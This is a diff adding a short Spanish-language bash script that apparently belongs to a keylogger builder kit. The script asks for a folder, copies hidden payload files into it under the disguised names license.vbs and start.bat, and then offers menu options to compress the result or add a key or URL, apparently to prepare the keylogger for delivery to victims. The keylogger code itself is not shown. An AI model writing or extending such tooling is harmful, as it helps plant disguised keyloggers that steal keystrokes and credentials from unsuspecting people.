@@ -1,0 +1,27 @@
+bash .banner
+echo "Introduce el nombre de la carpeta a la que quieres añedir el"
+echo "Keylogger:"
+echo ""
+ls
+echo ""
+read input
+bash .banner
+echo "Creando keylogger..."
+echo ""
+echo "Precione una tecla para continuar..."
+read input1
+cp .ky -r $input/sent/license.vbs
+cp .st -r $input/sent/start.bat
+bash .banner
+echo "Su Keylogger ha sido añedido exitosamente"
+echo "que desea hacer:"
+echo ""
+echo "==============="
+echo "1)Comprimirlo ="
+echo "2)Verlo       ="
+echo "3)Agregar Key ="
+echo "4)Agregar Url ="
+echo "5)Salir       ="
+echo "==============="
+read input2
+bash .$input2
